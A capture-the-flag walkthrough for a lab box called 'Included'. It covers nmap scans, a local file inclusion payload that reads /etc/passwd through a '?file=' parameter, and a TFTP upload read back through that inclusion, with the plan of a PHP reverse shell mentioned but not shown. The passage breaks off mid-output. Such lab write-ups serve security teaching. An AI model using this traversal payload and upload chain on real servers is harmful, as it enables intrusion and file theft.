---
title: "Writeup: Included"
date: 2021-01-17T19:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - included
  - Linux
  - update
  - nmap
  - passwords
  - lxc
  - dirsearch
  - webshell
  - LFI
  - TFTP
  - nc
  - strings
  - chmod
  - upgrade shell
  - nmap
---

Here are notes from the named target:
Target is Linux
Host name Included
IP 10.10.10.55

#Enumeration
Start with simple nmap

```yaml
┌──(root💀kali)-[~]
└─# nmap -A -v 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 20:42 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Initiating NSE at 20:42
Completed NSE at 20:42, 0.00s elapsed
Initiating Ping Scan at 20:42
Scanning 10.10.10.55 [4 ports]
Completed Ping Scan at 20:42, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:42
Completed Parallel DNS resolution of 1 host. at 20:42, 0.02s elapsed
Initiating SYN Stealth Scan at 20:42
Scanning 10.10.10.55 [1000 ports]
*Discovered open port 80/tcp on 10.10.10.55

```

only port found open was port 80 http so going to try UDP also

```yaml
nmap -sU -v 10.10.10.55
```

#This will take some time so going to check out web site in browser

Look at the webpage does not seem too special so take a look at page source and I see this in the URL block

```yaml
view-source:http://10.10.10.55/?file=index.php#
```

the URL has a tell for possible local file include to try

First it is *PHP

Second it has ?file= in the URL

The common path to check if it is vulnerable to LFI is the *../../../../etc/passwd file path

So by using this URL *http://10.10.10.55/?file=../../../../etc/passwd

We get the password file inserted at the top od the page for viewing. that also tells me if I can get a PHP reverse shell on the site I can use the browd\ser to fire it off

```yaml
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
*lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
*mike:x:1000:1000:mike:/home/mike:/bin/bash
*tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

*Oh look!* we have good intel here 
It has an account for *tftp* - good way to get in. A user account named *mike* and a service called *lxd* which is a service to host virtural file systems in linux like vbox does on laptops. some easy reading indicated this is also a way to do Linux PE to get root if you grt on the box.

We have tftp service running it seems:

```yaml
──(root💀kali)-[~]
└─# nmap -sU -v 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 20:47 EST

`
`
PORT   STATE         SERVICE
*69/udp open|filtered tftp*
```

#Gain a foothold

I know TFTP is running so going to try and connect to that but need some basic commands

```yaml
Invoking TFTP
To invoke TFTP, enter at the DCL prompt:

TFTP [host [port]]

┌──(root💀kali)-[~]
└─# tftp 10.10.10.55
tftp> help
?Invalid command
tftp> get
(files) 
usage: get host:file host:file ... file, or
       get file file ... file   if connected, or
       get host:rfile lfile
tftp> ls
?Invalid command
tftp> quit
                                                                                             
```
So it is working now test it by using PUT to put a test file on the server in the tftp directory

Make a file locally ant the connect to TFTP and put the file

touch 55test.txt > nano 55test.txt > this is a test file > save

this works too
```yaml
┌──(root💀kali)-[~]
└─# echo "this is a test" > test.txt

```
Now to send it - looks like it worked
```yaml
┌──(root💀kali)-[~]
└─# tftp 10.10.10.55
tftp> put test.txt
Sent 16 bytes in 0.1 seconds
tftp> 

```
Now to test if I can get to files placed in the tftp folder from the web browser

##Research:

```yaml
The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default root directory where files will be stored is /var/lib/tftpboot.Nov 19, 2015
```
Yes we can! -- go to URL http://10.10.10.55/?file=../../../../var/lib/tftpboot/test.txt

and View source URL - view-source:http://10.10.10.55/?file=../../../../var/lib/tftpboot/test.txt
```yaml
this is a test
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></titl
...
```





















